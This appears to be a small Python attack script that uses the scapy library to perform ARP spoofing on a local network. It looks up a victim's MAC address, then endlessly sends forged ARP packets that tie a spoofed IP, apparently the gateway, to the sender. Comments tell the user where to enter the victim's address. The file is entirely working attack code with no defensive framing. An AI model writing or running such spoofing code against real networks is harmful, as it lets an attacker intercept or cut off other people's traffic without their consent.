import  scapy.all as scapy
from subprocess import call
import time



def get_mac(ip):
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet=scapy.ARP(pdst=ip)
    final_packet=broadcast/arp_packet
    answer=scapy.srp(final_packet,timeout=2,verbose=True)[0]
    mac_addr=answer[0][1].hwsrc
    print(mac_addr)
    return mac_addr



op=1 # Op code 1 for ARP requests
victim=#"192.168.0.103"#write here victims ip address
spoof=#"192.168.0.1" #write hare the fake spoof ip which you wann send to the your victim

mac=get_mac(victim)

arp=scapy.ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)

while 1:
	scapy.send(arp)
	#time.sleep(2)
